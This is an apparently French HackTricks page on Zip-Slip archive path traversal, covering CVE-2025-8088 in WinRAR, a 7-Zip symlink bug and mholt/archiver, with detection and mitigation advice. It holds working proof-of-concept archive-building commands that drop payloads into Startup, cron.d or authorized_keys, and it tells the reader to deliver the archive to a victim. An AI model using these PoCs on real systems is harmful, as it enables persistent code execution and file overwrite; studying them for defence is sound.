# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Vue d'ensemble

De nombreux formats d'archive (ZIP, RAR, TAR, 7-ZIP, etc.) permettent à chaque entrée de contenir son propre **chemin interne**. Lorsqu'un utilitaire d'extraction respecte aveuglément ce chemin, un nom de fichier forgé contenant `..` ou un **chemin absolu** (par exemple `C:\Windows\System32\`) sera écrit en dehors du répertoire choisi par l'utilisateur.
Cette classe de vulnérabilité est largement connue sous le nom de *Zip-Slip* ou **archive extraction path traversal**.<sup>[[6]](#references)</sup>

Les conséquences vont de l'écrasement de fichiers arbitraires à l'obtention directe d'une **exécution de code à distance (RCE)** en déposant une charge utile dans un emplacement **auto-run**, tel que le dossier Windows *Startup*.

## Cause racine

1. L'attaquant crée une archive dans laquelle un ou plusieurs en-têtes de fichiers contiennent :
* Des séquences de traversal relatives (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Des chemins absolus (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Ou des **symlinks** forgés qui pointent en dehors du répertoire cible (fréquent dans les ZIP/TAR sur *nix*).
2. La victime extrait l'archive avec un outil vulnérable qui fait confiance au chemin intégré (ou suit les symlinks) au lieu de le nettoyer ou de forcer l'extraction sous le répertoire choisi.
3. Le fichier est écrit à l'emplacement contrôlé par l'attaquant, puis exécuté/chargé la prochaine fois que le système ou l'utilisateur déclenche ce chemin.

### Traversal via `.NET` `Path.Combine` + `ZipArchive`

Un anti-pattern .NET courant consiste à combiner la destination prévue avec le `ZipArchiveEntry.FullName` **contrôlé par l'utilisateur**, puis à extraire sans normaliser le chemin :<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Si `entry.FullName` commence par `..\\`, il effectue une traversal ; s’il s’agit d’un **chemin absolu**, le composant de gauche est entièrement ignoré, ce qui permet une **écriture arbitraire de fichier** en tant qu’identité d’extraction.
- Archive de proof-of-concept permettant d’écrire dans un répertoire `app` voisin surveillé par un scanner planifié :
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Déposer ce ZIP dans la boîte de réception surveillée crée `C:\samples\app\0xdf.txt`, prouvant la traversal en dehors de `C:\samples\queue\` et permettant des primitives de suivi (par exemple, des DLL hijacks).

## Exemple réel – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR pour Windows (y compris le CLI `rar` / `unrar`, la DLL et les sources portables) ne validait pas les noms de fichiers lors de l’extraction.  
Une archive RAR malveillante contenant une entrée telle que :
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
se retrouverait **en dehors** du répertoire de sortie sélectionné et dans le dossier *Startup* de l’utilisateur. Après la connexion, Windows exécute automatiquement tout ce qui s’y trouve, offrant ainsi une RCE *persistante*.<sup>[[5]](#references)</sup>

### Création d’une archive PoC (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options utilisées :
* `-ep`  – conserve les chemins de fichiers exactement tels qu’ils sont fournis (ne **supprime pas** les `./` initiaux).

Livrez `evil.rar` à la victime et demandez-lui de l’extraire avec une version vulnérable de WinRAR.

### Exploitation observée dans la nature

ESET a signalé des campagnes de spear-phishing de RomCom (Storm-0978/UNC2596) qui joignaient des archives RAR exploitant CVE-2025-8088 afin de déployer des backdoors personnalisées et de faciliter des opérations de ransomware.<sup>[[5]](#references)</sup>

## Cas plus récents (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug** : les entrées ZIP qui étaient des **symbolic links** étaient déréférencées lors de l’extraction, ce qui permettait aux attaquants de sortir du répertoire de destination et d’écraser des chemins arbitraires. L’interaction utilisateur consiste simplement à *ouvrir/extraire* l’archive.<sup>[[1]](#references)</sup>
* **Versions affectées** : 7-Zip 21.02–24.09 (builds Windows et Linux). Corrigé dans la version **25.00** (juillet 2025) et les suivantes.
* **Chemin d’impact** : écraser `Start Menu/Programs/Startup` ou des emplacements utilisés par des services → le code s’exécute à la prochaine ouverture de session ou au redémarrage du service.
* **PoC rapide (Linux)** :
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Avec une version corrigée, `/etc/cron.d` ne sera pas modifié ; le symlink sera extrait en tant que lien dans `/tmp/target`.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug** : `archiver.Unarchive()` suit les entrées ZIP contenant `../` et celles utilisant des symlinks, en écrivant en dehors de `outputDir`.<sup>[[2]](#references)</sup>
* **Versions affectées** : `github.com/mholt/archiver` ≤ 3.5.1 (projet désormais déprécié).
* **Correctif** : passer à `mholt/archives` ≥ 0.1.0 ou implémenter des vérifications de chemins canoniques avant l’écriture.
* **Reproduction minimale** :
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Conseils de détection

* **Inspection statique** – Lister les entrées de l’archive et signaler tout nom contenant `../`, `..\\`, des *chemins absolus* (`/`, `C:`) ou des entrées de type *symlink* dont la cible se trouve en dehors du répertoire d’extraction.
* **Canonicalisation** – Vérifier que `realpath(join(dest, name))` commence toujours par `dest`. Rejeter toute autre valeur.<sup>[[3]](#references)</sup>
* **Extraction en sandbox** – Décompresser dans un répertoire jetable à l’aide d’un extracteur *safe* (par exemple, `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) et vérifier que les chemins résultants restent dans le répertoire.
* **Surveillance des endpoints** – Déclencher une alerte lorsque de nouveaux exécutables sont écrits dans les emplacements `Startup`/`Run`/`cron` peu après l’ouverture d’une archive par WinRAR/7-Zip/etc.

## Mitigation & renforcement

1. **Mettre à jour l’extracteur** – WinRAR 7.13+ et 7-Zip 25.00+ implémentent une sanitisation des chemins et des symlinks. Les deux outils ne disposent toujours pas de mise à jour automatique.
2. Extraire les archives avec “**Do not extract paths**” / “**Ignore paths**” lorsque cela est possible.
3. Sous Unix, réduire les privilèges et monter un **chroot/namespace** avant l’extraction ; sous Windows, utiliser **AppContainer** ou une sandbox.
4. En cas de code personnalisé, normaliser avec `realpath()`/`PathCanonicalize()` **avant** la création/l’écriture, et rejeter toute entrée qui sort de la destination.

## Cas supplémentaires / historiques affectés

* 2018 – Avis massif *Zip-Slip* publié par Snyk, affectant de nombreuses bibliothèques Java/Go/JS.<sup>[[6]](#references)</sup>
* 2023 – 7-Zip CVE-2023-4011, traversal similaire lors d’une fusion avec `-ao`.
* 2025 – `go-slug` de HashiCorp (CVE-2025-0377), traversal lors de l’extraction TAR dans les slugs (correctif dans la v1.2).<sup>[[7]](#references)</sup>
* Toute logique d’extraction personnalisée qui n’appelle pas `PathCanonicalize` / `realpath` avant l’écriture.

## References

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)
- [6] [Snyk – Public Disclosure of a Critical Arbitrary File Overwrite Vulnerability: Zip Slip](https://snyk.io/blog/zip-slip-vulnerability/)
- [7] [HashiCorp – HCSEC-2025-01: go-slug Vulnerable to Zip Slip Attack (CVE-2025-0377)](https://discuss.hashicorp.com/t/hcsec-2025-01-hashicorp-go-slug-vulnerable-to-zip-slip-attack/72719)

{{#include ../banners/hacktricks-training.md}}
